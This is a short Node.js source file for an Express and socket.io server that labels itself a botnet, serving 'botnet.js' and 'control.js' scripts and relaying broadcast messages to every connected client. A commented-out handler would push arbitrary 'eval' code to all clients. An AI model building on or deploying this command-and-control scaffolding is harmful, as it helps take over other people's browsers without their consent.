var app = require('express')();
var http = require('http').Server(app);
var io = require('socket.io')(http);
var view = require('express-react-views').createEngine();

app.set('views', __dirname + '/views');
app.set('view engine', 'jsx');
app.engine('jsx', view);

app.get('/', function (req, res) {
   res.render('index', { name: "John" }); //help
});

app.get('/control', function (req, res) {
    res.render('control', {});
});

app.get('/botnetjs/botnet.js', function (req, res) {
    res.sendFile(__dirname + '/public/botnet.js');
});

app.get('/botnetjs/control.js', function (req, res) {
    res.sendFile(__dirname + '/public/control.js');
});

app.get('/status', function (req, res) {
    res.render('status', {});
});

http.listen(3000, function () {
    console.log('server started');
});

io.sockets.on('connection', function (socket) {
    console.log('a user connected');
    //console.log(socket);

    //console.dir({ address: socket.conn.remoteAddress});
/*
    socket.on('eval', function (data) {
        io.sockets.emit('eval', data);
        console.log('Alert Request From: ' + socket.conn.remoteAddress);
    });
*/
    socket.on('news', function (data) {
        console.log(data);
    });

    socket.on('broadcast-news', function (data) {
       io.sockets.emit('news', data);
    });

    socket.on('broadcast', function (data) {
        io.sockets.emit('news', data);
    });

    socket.emit('news', 'Welcome to the botnet. New connection: ' +
                socket.conn.remoteAddress);
});

